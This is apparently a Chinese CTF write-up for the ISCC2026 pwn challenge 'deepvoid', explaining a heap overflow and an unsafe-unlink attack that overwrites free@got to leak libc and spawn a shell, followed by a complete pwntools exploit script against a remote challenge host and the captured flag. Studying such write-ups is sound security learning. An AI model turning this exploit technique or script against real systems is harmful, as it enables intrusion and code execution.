+++
title = "deepvoid"
date = "2026-05-15"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

=========================


### PWN+deepvoid

### 解题思路（必须包含文字说明+截图）

因此：

-   栈上直接 ROP 不方便，且程序本身没有明显栈溢出点。

-   No PIE 说明程序本体地址固定，GOT 和全局变量地址可直接使用。

-   Partial RELRO 意味着可以覆盖 GOT 表。

程序逻辑
--------

程序提供 3 个主要功能：

1.  Create

2.  Modify

3.  Remove

全局有一个指针数组 chunks，地址是：

chunks = 0x6020c0

三个核心函数行为如下：

### Create

-   输入下标 idx

-   输入大小 size

-   执行 malloc(size)

-   返回的指针保存到 chunks\[idx\]

### Modify

-   输入下标 idx

-   若 chunks\[idx\] 非空，则执行：

read(0, chunks\[idx\], 0x200);

这里是核心漏洞。read 固定读取 0x200 字节，但 chunk 的申请大小是可控的，所以当申请的 chunk 小于 0x200 时，就会发生堆溢出。

### Remove

-   输入下标 idx

-   若 chunks\[idx\] 非空，则 free(chunks\[idx\])

-   然后将 chunks\[idx\] = 0

漏洞分析
--------

漏洞本质是：

malloc(size);

read(0, ptr, 0x200);

也就是典型的堆溢出。

附件给了 libc.so.6，这次做题用的 unsafe unlink。

利用思路：

1.  申请多个相邻 chunk。

2.  从前一个 chunk 溢出，伪造后一个 chunk 的堆元数据。

3.  free 伪造过的 chunk，触发 unlink。

4.  利用 unlink 把全局 chunks 数组改成可控内容。

5.  通过伪造后的 chunks 实现任意地址写。

6.  覆盖 free@got 为 puts@plt，先泄漏 libc。

7.  再把 free@got 改成 system。

8.  最后调用 free("/bin/sh")，实际执行 system("/bin/sh")。

利用过程
--------

### 1. 布置堆块

申请：

chunk0 = malloc(0x80)

chunk1 = malloc(0x80)

chunk2 = malloc(0x80)

chunk3 = malloc(0x20)

这样几个 chunk 在堆上相邻，方便从 chunk0 溢出覆盖 chunk1 的头部。

### 2. 伪造 chunk1 元数据

从 chunk0 写入伪造数据，把 chunk1 伪造成可被 unlink 的 chunk：

fake\_chunk = flat(

0,

0x80,

chunks - 0x18,

chunks - 0x10,

)

fake\_chunk = fake\_chunk.ljust(0x80, b"A")

fake\_chunk += p64(0x80)

fake\_chunk += p64(0x90)

关键点：

-   fd = chunks - 0x18

-   bk = chunks - 0x10

这样在 unlink 时会把写操作落到全局 chunks 附近。

### 3. 触发 unsafe unlink

执行：

remove(1)

这样 free(chunk1) 时会进入 unlink，把 chunk0 变成一个可以覆盖 chunks 数组内容的原语。

### 4. 重写 chunks 数组

接着利用 modify(0, ...) 直接改写 chunks 的若干槽位：

layout = b"B" \* 0x18 + flat(

chunks - 0x18,

elf.got\["free"\],

elf.got\["puts"\],

binsh,

0,

0,

0,

0,

)

这样后续：

-   chunks\[1\] -&gt; free@got

-   chunks\[2\] -&gt; puts@got

-   chunks\[3\] -&gt; .bss 可写地址，用来存 /bin/sh

此时 modify(idx, data) 就相当于对任意目标地址写数据。

### 5. 泄漏 libc

先把 free@got 改成 puts@plt：

modify(1, p64(elf.plt\["puts"\]))

再触发：

remove(2)

因为 remove(2) 本来会调用 free(chunks\[2\])，而现在 free@got 已经被改成了 puts@plt，所以实际执行的是：

puts(puts@got)

即可泄漏 puts 的真实 libc 地址，计算出 libc 基址。

### 6. 劫持 free 为 system

有了 libc 基址后，把 free@got 改成 system：

modify(1, p64(libc.sym\["system"\]))

然后把 /bin/sh 写到 chunks\[3\] 指向的位置：

modify(3, b"/bin/sh\\\\x00")

最后：

remove(3)

原本是 free(chunks\[3\])，现在会变成：

system("/bin/sh")

从而得到 shell。

flag
----

远程打通 39.96.193.120:55555 后拿到：

ISCC{a521640c-48f4-4061-8e19-6180c3362960}

写wp时的flag：\
EXP
---

from pathlib import Path

from pwn import \*

BIN = "deepvoid"

LIBC = "libc.so.6"

HOST = "39.96.193.120"

PORT = 55555

context.binary = elf = ELF(BIN)

context.log\_level = "debug"

libc = ELF(LIBC)

context.arch = "amd64"

def cmd(io, choice):

io.sendlineafter(b"CMD &gt;&gt; ", str(choice).encode())

def create(io, idx, size):

cmd(io, 1)

io.sendlineafter(b"Serial: ", str(idx).encode())

io.sendlineafter(b"Size: ", str(size).encode())

def modify(io, idx, data):

cmd(io, 2)

io.sendlineafter(b"Serial: ", str(idx).encode())

io.sendafter(b"Update Data: ", data)

def remove(io, idx):

cmd(io, 3)

io.sendlineafter(b"Serial: ", str(idx).encode())

def main():

io = remote(HOST, PORT)

chunks = 0x6020C0

binsh = chunks + 0x40

create(io, 0, 0x80)

create(io, 1, 0x80)

create(io, 2, 0x80)

create(io, 3, 0x20)

fake\_chunk = flat(

0,

0x80,

chunks - 0x18,

chunks - 0x10,

)

fake\_chunk = fake\_chunk.ljust(0x80, b"A")

fake\_chunk += p64(0x80)

fake\_chunk += p64(0x90)

modify(io, 0, fake\_chunk)

remove(io, 1)

\# After unlink, chunk 0 overlaps the global chunks array and becomes an arbitrary write primitive.

layout = b"B" \* 0x18 + flat(

chunks - 0x18,

elf.got\["free"\],

elf.got\["puts"\],

binsh,

0,

0,

0,

0,

)

modify(io, 0, layout)

modify(io, 3, b"/bin/sh\\x00")

modify(io, 1, p64(elf.plt\["puts"\]))

remove(io, 2)

leak = u64(io.recvline().strip().ljust(8, b"\\x00"))

libc.address = leak - libc.sym\["puts"\]

log.success(f"puts leak: {hex(leak)}")

log.success(f"libc base: {hex(libc.address)}")

modify(io, 1, p64(libc.sym\["system"\]))

remove(io, 3)

io.interactive()

if \_\_name\_\_ == "\_\_main\_\_":

main()
